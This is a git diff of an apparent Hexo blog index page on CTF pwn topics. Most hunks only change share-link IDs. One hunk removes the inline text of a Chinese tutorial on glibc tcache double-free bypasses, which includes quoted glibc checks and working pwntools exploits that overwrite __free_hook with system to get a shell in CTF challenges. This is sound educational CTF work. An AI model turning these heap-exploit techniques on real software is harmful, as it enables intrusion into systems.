@@ -107,7 +107,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/08/02/BUU刷题集/" data-id="ckdlmpmuh0000vgswnlmjn424"
+      <a data-url="https://c0yo7e.github.io/2020/08/02/BUU刷题集/" data-id="ckdlmrlkf000040swbw482xm9"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>
@@ -166,47 +166,13 @@
       
         <h2 id="tcache-glibc2-27"><a href="#tcache-glibc2-27" class="headerlink" title="tcache glibc2.27"></a>tcache glibc2.27</h2><p>glibc2.27版本的tcache是可以double free处理的，利用起来就很方便</p>
 <p>tcache会把之前malloc的chunk在free完之后写入tcache list里面</p>
-<p>常规操作的话，我们需要将chunk写进unsorted bin才能leak出main_area的地址<br>而想要跳出tcache list 可以利用double free将a-&gt;a的形式写入tcache list (<code>free 同一个 chunk</code>)<br>这个时候，指针count为2，<br>在malloc同一个大小，不进行写入参数时，可以不断地往那个tcache list里拿那个地址，并且count -1<br>使得count为-1时，不再写入tcache list，而是写进unsorted bin list<br>接下来就可以正常泄露libc了</p>
-<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="V-amp-N公开赛2020-easyTheap"><a href="#V-amp-N公开赛2020-easyTheap" class="headerlink" title="V&amp;N公开赛2020 easyTheap"></a>V&amp;N公开赛2020 easyTheap</h4><p>最简单的double free + tcache</p>
-<p>要想leak出libc的地址就要把chunk free进unsortedbin里<br>这里就要用了</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment">#tcache-1</span></span><br><span class="line">delete(<span class="number">0</span>)  <span class="comment">#tcache-2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x260</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2 tcache-1</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#3 tcache-0</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4 tcache- -1-&gt;绕过</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></table></figure>
-
-<h4 id="SCTF2019-one-heap"><a href="#SCTF2019-one-heap" class="headerlink" title="SCTF2019 one_heap"></a>SCTF2019 one_heap</h4><p>这题也是要先绕过tcache来leak地址的<br>第一步操作是一样的</p>
-<p>具体exp见<a href="https://c0yo7e.github.io/2020/08/01/IO-FILE-leakaddr/#2019-one-heap">这里</a></p>
-<h2 id="tcache-glibc2-29"><a href="#tcache-glibc2-29" class="headerlink" title="tcache glibc2.29"></a>tcache glibc2.29</h2><p>结构体新增了key指针</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">/* 新增指针 */</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果e-&gt;key == tcache，程序会从链表头检索chunk，如果检索到了chunk e，说明tcache中已经存在chunk e，再次释放就会触发double free。<br>这就意味着我们在2.29下就没办法用double free绕过tcache了</p>
-<p>因此绕过想绕过检测进行double free，e-&gt;key 是入手点。</p>
-<h3 id="绕过实现tcache-double-free思路"><a href="#绕过实现tcache-double-free思路" class="headerlink" title="绕过实现tcache double free思路"></a>绕过实现tcache double free思路</h3><blockquote>
-<p>如果有UAF漏洞或堆溢出，可以修改e-&gt;key为空，或者其他非tcache_perthread_struct的地址。这样可以直接绕过_int_free里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</p>
-<p>利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到_int_free里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。</p>
-</blockquote>
-<p>（from: <a href="https://xz.aliyun.com/t/7292#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7292#toc-2</a>)</p>
-<h4 id="picoctf2019-zero-to-hero"><a href="#picoctf2019-zero-to-hero" class="headerlink" title="picoctf2019 zero_to_hero"></a>picoctf2019 zero_to_hero</h4><p>其实没有碰到过这类的题，就按着<a href="https://xz.aliyun.com/t/7292#toc-3" target="_blank" rel="noopener">师傅的blog</a>来讲一下这个通过改了size之后free到不同tcache队列实现double free的题吧</p>
-<p>首先题目友好的给出了system的地址，就不需要我们leak了，我们就只需要直接用tcache操作进行改free_hook为system，执行即可</p>
-<p>第一步先malloc两个chunk（第二个要求大于0x110）并将两个chunk free掉<br>然后malloc第一个chunk，通过off by null把第二个chunk的size 从0x1xx变成0x100<br>再free第二个chunk就可以实现double free了</p>
-<p>接下来就是常规操作了，具体操作可以看<a href="https://xz.aliyun.com/t/7292#toc-3" target="_blank" rel="noopener">师傅的blog</a></p>
-<h3 id="绕过tcache实现unsortedbin上操作"><a href="#绕过tcache实现unsortedbin上操作" class="headerlink" title="绕过tcache实现unsortedbin上操作"></a>绕过tcache实现unsortedbin上操作</h3><blockquote>
-<p>tcache每一个大小的chunk个数上限是7，填满之后就会往unsortedbin里填，我们可以先将tcache填满之后再操作</p>
-</blockquote>
-<h4 id="ctf2019-girlfriends"><a href="#ctf2019-girlfriends" class="headerlink" title="*ctf2019 girlfriends"></a>*ctf2019 girlfriends</h4><p>这题在free的地方没清空指针，可以进行double free</p>
-<p>step1：leak libc<br>我们可以malloc一个超过tcache大小的chunk（largebin），free完直接进入largebin，可以直接leak出libc</p>
-<p>step2：填满tcache用fastbin构造double free</p>
-<p>step3：通过double_free的链，将free_hook填上system。</p>
-<p>PS: 在申请时首先清空对应tcache链上的内容，然后再申请fastbin里的chunk，<code>当tcache里没有chunk而fastbin里有chunk时，会将fastbin里的chunk放入tcache</code></p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment"># # p=remote('node3.buuoj.cn',26796)</span></span><br><span class="line">pwn_file=<span class="string">"./lib/ld-2.29.so --library-path ./lib/ ./starctf_2019_girlfriend"</span></span><br><span class="line"><span class="comment">#pwn_file = "./babyheap"</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./starctf_2019_girlfriend"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF("./lib/libc.so.6")</span></span><br><span class="line">p=process(pwn_file.split())</span><br><span class="line"><span class="comment"># p=remote('node3.buuoj.cn',26796)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,call)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the size of girl's name"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please inpute her name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"please input her call:"</span>)</span><br><span class="line">    p.send(call)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delte</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#1</span></span><br><span class="line">delte(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3b1ca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xdf99d</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#2-8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">delte(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	delte(i+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>) <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fill tcache</span></span><br><span class="line">delte(<span class="number">9</span>)</span><br><span class="line">delte(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin</span></span><br><span class="line">delte(<span class="number">11</span>)</span><br><span class="line">delte(<span class="number">12</span>)</span><br><span class="line"><span class="comment"># delte(13)</span></span><br><span class="line"><span class="comment"># delte(12)</span></span><br><span class="line">delte(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>)<span class="comment">#13-19</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,p64(free_hook),<span class="string">'coyote'</span>)<span class="comment">#20  -11</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"coyote"</span>,<span class="string">"coyote"</span>)<span class="comment">#21 -12</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"/bin/sh"</span>,<span class="string">"coyote"</span>) <span class="comment">#22 -11</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(system),<span class="string">'coyote'</span>) <span class="comment">#23</span></span><br><span class="line"></span><br><span class="line">delte(<span class="number">22</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>参考链接：<a href="https://x3h1n.github.io/2019/06/21/starctf-2019-girlfriend/" target="_blank" rel="noopener">https://x3h1n.github.io/2019/06/21/starctf-2019-girlfriend/</a></p>
-
+        
+          <a class="article-more-link" href="/2020/08/08/tcache浅析/">Read More...</a>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/08/08/tcache浅析/" data-id="ckdlmpmz7000uvgswihbxgmei"
+      <a data-url="https://c0yo7e.github.io/2020/08/08/tcache浅析/" data-id="ckdlmrlmb001140swdhrj1cyu"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
@@ -270,7 +236,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/08/06/largebin-attack-glibc2-29/" data-id="ckdlmpmyr000mvgswi7koqbhp"
+      <a data-url="https://c0yo7e.github.io/2020/08/06/largebin-attack-glibc2-29/" data-id="ckdlmrlky000c40swvnio8wdi"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwm知识点/">pwm知识点</a></li></ul>
@@ -335,7 +301,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/" data-id="ckdlmpmy9000evgswa4qfaqn7"
+      <a data-url="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/" data-id="ckdlmrlkw000940swowifu5hz"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
@@ -404,7 +370,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/08/01/IO-FILE-leakaddr/" data-id="ckdlmpmvz0003vgsw84a1pjla"
+      <a data-url="https://c0yo7e.github.io/2020/08/01/IO-FILE-leakaddr/" data-id="ckdlmrlko000340swu3axkgau"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
@@ -473,7 +439,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/05/12/mips编译环境配置与简单栈溢出/" data-id="ckdlmpmyj000ivgswn1rdv13h"
+      <a data-url="https://c0yo7e.github.io/2020/05/12/mips编译环境配置与简单栈溢出/" data-id="ckdlmrll1000d40swu601d2j5"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/others/">others</a></li></ul>
@@ -538,7 +504,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/03/10/house-of-orange/" data-id="ckdlmpmy7000cvgswvmteunpe"
+      <a data-url="https://c0yo7e.github.io/2020/03/10/house-of-orange/" data-id="ckdlmrlkv000840swz82c39n5"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
@@ -604,7 +570,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/02/18/unlink/" data-id="ckdlmpmza000yvgsw28jglh2q"
+      <a data-url="https://c0yo7e.github.io/2020/02/18/unlink/" data-id="ckdlmrlmh001740swdr5f75fx"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
@@ -669,7 +635,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/02/07/arm的环境搭建-简单的例题/" data-id="ckdlmpmw20006vgswpyeyfato"
+      <a data-url="https://c0yo7e.github.io/2020/02/07/arm的环境搭建-简单的例题/" data-id="ckdlmrlkr000540swtbj5p6hn"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
@@ -733,7 +699,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://c0yo7e.github.io/2020/02/07/fastbinin-attack/" data-id="ckdlmpmy5000bvgsw1ojav3j4"
+      <a data-url="https://c0yo7e.github.io/2020/02/07/fastbinin-attack/" data-id="ckdlmrlkq000440swt93vezld"
          class="article-share-link">Share</a>
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn知识点/">pwn知识点</a></li></ul>
